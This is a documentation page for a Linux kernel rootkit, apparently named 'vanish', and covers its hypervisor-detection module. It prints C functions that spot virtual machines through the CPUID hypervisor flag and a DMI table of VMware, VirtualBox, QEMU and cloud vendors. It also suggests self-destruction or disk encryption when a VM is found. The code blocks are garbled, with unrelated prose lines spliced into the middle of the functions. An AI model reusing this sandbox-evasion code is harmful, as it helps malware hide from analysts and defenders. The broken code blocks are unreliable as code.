\page vm_detect Hypervisor Detection

\tableofcontents

## 1. 🕵️‍♂️ Detection

Detection of a virtual environment by our rootkit relies on two complementary mechanisms: analyzing CPU features to identify the presence of a hypervisor, and querying DMI or *Desktop Management Interface* information to spot hardware signatures typical of virtual machines. These two approaches, combined in the `is_running_in_virtual_env` function, therefore allow us low-level (CPU) and high-level (firmware) verification...

Moreover, hypervisor presence can be signaled through the `HYPERVISOR` flag in CPU features, exposed by the CPUID instruction. Our `check_hypervisor` function exploits this mechanism. It thus invokes `boot_cpu_has` with the `X86_FEATURE_HYPERVISOR` argument, which returns `true` if, during kernel initialization, the `HYPERVISOR` flag was detected.

```cMultiple techniques are used to detect virtualization:

bool check_hypervisor(void) {- CPU vendor strings

    return boot_cpu_has(X86_FEATURE_HYPERVISOR);- Hardware characteristics

}- Hypervisor presence indicators

```

## Command

As for DMI, it's a standard that allows BIOS/UEFI to provide hardware and manufacturer information to the OS... Thus, among this information is the vendor name (`SYS_VENDOR`) and other identifiers. We therefore use the `hypervisor_dmi_table` array to check this name. Each entry compares the string returned by BIOS (`DMI_SYS_VENDOR`) with a known vendor name that acts as a hypervisor

```cUse `is_in_vm` to check virtualization status.

bool check_dmi(void) {

    static const struct dmi_system_id hypervisor_dmi_table[] = {## Purpose

        { .ident = "VMware", .matches = { DMI_MATCH(DMI_SYS_VENDOR, "VMware") } },

        { .ident = "VirtualBox",Helps the rootkit adapt its behavior based on the environment.

          .matches = { DMI_MATCH(DMI_SYS_VENDOR, "innotek GmbH") } },
        { .ident = "QEMU", .matches = { DMI_MATCH(DMI_SYS_VENDOR, "QEMU") } },
        { .ident = "DigitalOcean",
          .matches = { DMI_MATCH(DMI_SYS_VENDOR, "DigitalOcean") } },
        { .ident = "OpenStack",
          .matches = { DMI_MATCH(DMI_SYS_VENDOR, "OpenStack") } },
        { .ident = "Scaleway", .matches = { DMI_MATCH(DMI_SYS_VENDOR, "Scaleway") } },
        {}
    };

    return dmi_check_system(hypervisor_dmi_table) > 0;
}
```

The main function `is_running_in_virtual_env` finally uses these two checks to return `true` as soon as either mechanism signals a virtualized environment.
```c
bool is_running_in_virtual_env(void) {
    if (check_hypervisor()) {
        ERR_MSG("vanish: hypervisor detected...");
        return true;
    }

    if (check_dmi()) {
        ERR_MSG("vanish: virtual environment detected...");
        return true;
    }

    return false;
}
```

This is admittedly a fairly simplistic approach, but according to our tests, it allows detecting the virtual environment in most cases. As for the vendor list, it's obviously not exhaustive, and in real use, we would need to study in more depth the names of other providers. Moreover, our rootkit currently only uses this functionality for informational purposes, but in real conditions one could imagine a self-destruction action, behavior modification, ftrace hook deactivation, or even total disk encryption...

## 2. ⚰️ Cemetery

This section may not have the best place here, but it still needed a little corner. Let's pay tribute to the countless virtual machines fallen in combat (a good dozen, at least): without their glaring pagefaults, their capricious free() problems, their unforgettable memory leaks and their repeated crashes, this project would never have seen the light of day. Some *sensitive virtual souls* didn't survive the ordeal, and for that, sniff sniff, we mourn them. May they rest in peace in our logs, and may their sacrifice not have been in vain!

> We will never forget you, dear VMs. ❤️










<img 
  src="logo_no_text.png" 
  style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  "
/>
